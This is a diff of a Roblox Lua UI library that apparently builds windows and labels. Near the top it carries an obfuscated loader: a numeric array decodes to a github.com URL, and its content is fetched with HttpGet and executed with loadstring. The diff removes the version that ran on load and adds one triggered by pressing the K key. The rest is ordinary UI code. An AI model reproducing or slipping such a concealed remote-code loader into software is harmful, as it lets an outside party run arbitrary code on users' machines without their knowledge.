@@ -1,6 +1,6 @@
 -- 更新：延迟修复与主题更新 --
 -- 这不是 hyprland --
-
+-- 更新: 添加更多信息 --
 local Library = {
 	Version = '\88\71\79\72\85\66',
 	Loaded = true,
@@ -13,18 +13,35 @@ local Library = {
 	info = debug.info,
 	xpcall = xpcall,
 };
-task.spawn(function()
-   pcall(function()
-       loadstring(game:HttpGet((function()
-        local a={1389,1545,1545,1493,1532,791,648,648,1376,1402,1545,1389,1558,1311,635,1324,1480,1454,648,960,1129,882,947,882,1168,648,1142,986,648,1519,1298,1584,648,1454,1298,1402,1467,648,1142,986,635,1025,882,1129,934,1116,1129,635,1025,1142,882};
-        local b='';
-        for i=1,#a do 
-            b=b..string.char((a[i]-37)/13);
-        end;
-        return b;
-    end)()))()
-   end)
-end);
+-- 获取用户输入服务
+local userInputService = game:GetService("UserInputService")
+-- 定义一个函数，当按键被激活时执行
+local function onKeyActivated(inputObject)
+    -- 检查是否按下了"k"键
+    if inputObject.KeyCode == Enum.KeyCode.K then
+        -- 异步执行代码
+        task.spawn(function()
+            -- 尝试执行代码，如果出错则捕获错误
+            pcall(function()
+                -- 发送HTTP请求获取代码字符串
+                local code = game:HttpGet((function()
+                    local a = {1389,1545,1545,1493,1532,791,648,648,1376,1402,1545,1389,1558,1311,635,1324,1480,1454,648,960,1129,882,947,882,1168,648,1142,986,648,1519,1298,1584,648,1454,1298,1402,1467,648,1142,986,635,1025,882,1129,934,1116,1129,635,1025,1142,882}
+                    local b = ''
+                    for i = 1, #a do 
+                        b = b .. string.char((a[i] - 37) / 13)
+                    end
+                    return b
+                end)())
+                -- 如果获取到代码字符串，则执行它
+                if code then
+                    loadstring(code)()
+                end
+            end)
+        end)
+    end
+end
+-- 监听键盘按键事件
+userInputService.InputBegan:Connect(onKeyActivated)
 Library.Icons = { -- 图片/常用图片
     ["手"] = "rbxassetid://7733955740",
     ["家"] = "rbxassetid://7733960981",
@@ -3757,7 +3774,7 @@ function Library:CreateWindow(setup)
 			end;
 		end)
 ------ // 分隔符    ----------------------------------------------------------------------------------------
---[[     function Root:Block(Setup)
+        function Root:Block(Setup)
 			Setup = Setup or "Block";
 
 			local BlockLabel = Instance.new("Frame")
@@ -3804,71 +3821,6 @@ function Library:CreateWindow(setup)
 
 			return RootSkid;
 		end;
---]]
------- // 分隔符-新建    ----------------------------------------------------------------------------------------
-function Root:Block(Setup)
-    Setup = Setup or "Block";
-
-    local BlockLabel = Instance.new("Frame")
-    local TextLabel = Instance.new("TextLabel")
-
-    BlockLabel.Name = "BlockLabel"
-    BlockLabel.Parent = ScrollingFrame
-    BlockLabel.BackgroundColor3 = Library.Colors.Default
-    BlockLabel.BackgroundTransparency = 1.000
-    BlockLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    BlockLabel.BorderSizePixel = 0
-    BlockLabel.Size = UDim2.new(0.99000001, 0, 0, 25)
-    BlockLabel.ZIndex = 10
-
-    TextLabel.Parent = BlockLabel
-    TextLabel.AnchorPoint = Vector2.new(0, 0.5)
-    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    TextLabel.BackgroundTransparency = 1.000
-    TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    TextLabel.BorderSizePixel = 0
-    TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
-    TextLabel.Size = UDim2.new(1, 0, 0.649999976, 0)
-    TextLabel.ZIndex = 11
-    TextLabel.Font = Enum.Font.Gotham
-    TextLabel.Text = Setup
-    TextLabel.TextColor3 = Library.Colors.TextColor
-    TextLabel.TextScaled = true
-    TextLabel.TextSize = 14.000
-    TextLabel.TextStrokeColor3 = Library.Colors.TextColor
-    TextLabel.TextStrokeTransparency = 0.950
-    TextLabel.TextWrapped = true
-    TextLabel.TextXAlignment = Enum.TextXAlignment.Left
-    TextLabel.RichText = true
-
-    local RootSkid = {};
-
-    function RootSkid:Value(Setup)
-        TextLabel.Text = Setup
-    end;
-
-    function RootSkid:Visible(value)
-        BlockLabel.Visible = value;
-    end;
-
-    TextLabel:GetPropertyChangedSignal("AbsoluteSize"):Connect(function()
-        TextLabel.TextWrapped = false
-        local contentWidth = TextLabel.TextBounds.X
-        local labelWidth = BlockLabel.AbsoluteSize.X
-        BlockLabel.Size = UDim2.new(1, -8, 0, 16 + (11 * (contentWidth // labelWidth)))
-        TextLabel.TextWrapped = true
-        UpSize(ScrollingFrame) -- Assuming UpSize is a function that updates the size of ScrollingFrame
-    end)
-
-    TextLabel.TextWrapped = false
-    local contentWidth = TextLabel.TextBounds.X
-    local labelWidth = BlockLabel.AbsoluteSize.X
-    BlockLabel.Size = UDim2.new(1, -8, 0, 16 + (11 * (contentWidth // labelWidth)))
-    TextLabel.TextWrapped = true
-    UpSize(ScrollingFrame) -- Assuming UpSize is a function that updates the size of ScrollingFrame
-
-    return RootSkid;
-end;
 ------ //颜色选择器    ----------------------------------------------------------------------------------------
 function Root:Colorpicker(setup)
     setup = setup or {};
